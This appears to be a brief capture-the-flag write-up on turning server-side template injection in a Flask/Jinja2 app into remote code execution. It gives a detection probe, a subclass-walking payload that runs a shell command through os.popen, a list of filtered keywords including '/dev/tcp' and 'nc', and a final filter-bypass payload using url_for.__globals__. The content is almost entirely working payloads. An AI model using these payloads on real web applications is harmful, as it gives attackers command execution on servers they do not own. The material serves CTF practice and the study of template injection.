# SSTI -> RCE

1) {{7*7}} to check SSTI vulnerability



2)Usually this kind of payload works:
--> {{"foo".__class__.__base__.__subclasses__()[147].__init__.__globals__['sys'].modules['os'].popen("ls").read()}}

but word "__class__", "/dev/tcp", 'nc', netcat are blocked  

Flag can be get using the "url_for" built-in function from flask

Final-payload:- {{url_for.__globals__.os.popen("ls").read()}}
